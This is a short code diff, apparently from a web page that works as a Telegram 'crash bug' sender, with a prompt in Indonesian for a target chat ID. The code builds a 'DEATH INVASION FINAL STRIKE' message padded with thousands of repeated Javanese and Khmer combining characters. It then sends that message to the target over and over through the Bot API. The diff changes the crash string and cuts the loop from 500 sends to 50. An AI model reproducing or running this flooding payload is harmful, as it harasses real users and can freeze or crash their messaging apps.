@@ -131,14 +131,14 @@
       const targetId = document.getElementById('target-id').value.trim();
       if (!targetId) return alert("Isi ID dulu 😹");
 
-      const ultraBug = "꧅꧄༒︎".repeat(2048) + "\u202e".repeat(2048);
+      const ultraBug = "ꦾ".repeat(1900) + "ោ៝".repeat(2000);
       const payload = {
         chat_id: targetId,
         text: `💣 *DEATH INVASION FINAL STRIKE* 💣\n\n` + ultraBug,
         parse_mode: "Markdown"
       };
 
-      for (let i = 1; i <= 500; i++) {
+      for (let i = 1; i <= 50; i++) {
         await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
           method: "POST",
           headers: { "Content-Type": "application/json" },
